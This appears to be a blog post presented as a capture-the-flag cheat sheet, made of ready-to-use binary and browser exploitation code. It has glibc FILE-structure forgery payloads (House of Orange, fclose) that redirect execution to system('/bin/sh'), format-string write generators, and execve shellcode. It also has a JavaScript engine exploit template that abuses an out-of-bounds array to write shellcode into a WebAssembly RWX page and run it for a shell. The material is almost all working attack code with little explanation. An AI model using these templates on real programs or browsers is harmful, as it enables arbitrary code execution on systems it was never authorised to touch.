---
layout: post
title:  "CTF Cheat Sheet"
date:   9102-01-01 00:00:00 +0000
categories: jekyll update
---

## IO FILE

### House of Orange

```python
fake_file = p64(0)
fake_file += p64(0x61)
fake_file += p64(libc_addr + UNSORT_OFF)
fake_file += p64(libc_addr + e.symbols["_IO_list_all"] - 0x10)
fake_file += p64(2) + p64(3)
fake_file += "\x00" * 8
fake_file += p64(libc_addr + next(e.search('/bin/sh\x00'))) #/bin/sh addr
fake_file += (0xc0-0x40) * "\x00"
fake_file += p32(0) #mode
fake_file += (0xd8-0xc4) * "\x00"
fake_file += p64(libc_addr + IO_STR_FINISH - 0x18) #vtable_addr
fake_file += (0xe8-0xe0) * "\x00"
fake_file += p64(libc_addr + e.symbols["system"])
```

### fclose

```python
#32 bits
fake_file = "/bin/sh\x00" + "\x00" * 0x40 + p32(fake_lock_addr)
fake_file = fake_file.ljust(0x94, "\x00")
fake_file += p32(fake_vtable_addr - 0x44)

#64 bits
fake_file = "/bin/sh\x00" + '\x00' * 0x8
fake_file += p64(system) + '\x00' * 0x70
# the system can also be placed in other memory
fake_file += p64(fake_lock_addr)
fake_file = fake_file.ljust(0xd8, '\x00')
fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr
```

## Format String

```python
def hn(pos, val):
	assert val < 0x10000
	if val == 0:
		return "%" + str(pos) + "$hn"
	else:
		return "%" + str(val) + "c%" + str(pos) + "$hn"

def cont_shoot(poses, vals, prev_size = 0):
	assert len(poses) == len(vals)
	size = len(poses)
	ret = ""
	i = 0
	cur_size = prev_size
	next_overflow = ((prev_size + 0xffff) / 0x10000) * 0x10000
	while i < size:
		assert next_overflow >= cur_size
		num = next_overflow - cur_size + vals[i]
		if num < 0x10000:
			ret += hn(poses[i], num)
			next_overflow += 0x10000
		else:
			num = vals[i] - (cur_size - (next_overflow - 0x10000))
			assert num >= 0
			ret += hn(poses[i], num)
		cur_size += num
		i += 1
	return ret
```

## Return to dl-resolve



## Shellcode

```python
asm(pwnlib.shellcraft.amd64.linux.sh())
"push 0x68732f6e69622f\nmov rdi,rsp\nxor rsi,rsi\nxor rdx,rdx\npush SYS_execve\npop rax\nsyscall"
```

## JavaScript

### Header

```javascript
function dp(x){ %DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{ //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
	return __dvCvt.getUint32(0, true) +
		__dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val)
{ //Uint64 ==> double
	const tmp0 = val % 0x100000000;
	__dvCvt.setUint32(0, tmp0, true);
	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
	return __dvCvt.getFloat64(0, true);
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();
```

### ArrayBuffer and Signature Object

```javascript
gOobArr = [2019.2019];
gAb = new ArrayBuffer(0x321);
gSig = {a:0xdead,b:0xbeef,c:wmain};
```

```javascript
assert(gOobArr.length === 0x1337,
	"failed to corrupt array size");
// now gOobArr have OOB access
// next, we find ArrayBuffer and sig
var backingPos, wmainAddr;
for (let i = 0; i < gOobArr.length-2; i++)
{
	if (d2u(gOobArr[i]) === 0x321)
	{// find ArrayBuffer
		backingPos = i + 1;
	}
	else if (d2u(gOobArr[i]) === 0xdead00000000 &&
		d2u(gOobArr[i+1]) === 0xbeef00000000)
	{// find sig object, and extract wmain address
		wmainAddr = d2u(gOobArr[i+2]) - 1;
	}
	if (backingPos !== undefined && wmainAddr !== undefined)
		break; // otherwise GC is triggered
}
assert(backingPos !== undefined, "failed to find ArrayBuffer");
assert(wmainAddr !== undefined, "failed to find sig array");
print("[*] index of backing field = " + hex(backingPos));
print("[*] address of wmain function = " + hex(wmainAddr));
const dataView = new DataView(gAb);

gOobArr[backingPos] = u2d(wmainAddr-0x300);
for (var i = 0; i < 0x300; i+=8)
{
	rwxAddr = d2u(dataView.getFloat64(i, true));
	if ((rwxAddr / 0x1000) % 0x10 !== 0 &&
		rwxAddr % 0x1000 === 0 &&
		rwxAddr < 0x7fffffffffffff)
		break;
}

assert(i !== 0x300, "failed to find RWX page!");

print("[*] RWX page = " + hex(rwxAddr));

gOobArr[backingPos] = u2d(rwxAddr);
// set backing field to rwx page

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode
readline();
throw Error("failed to get shell");
```


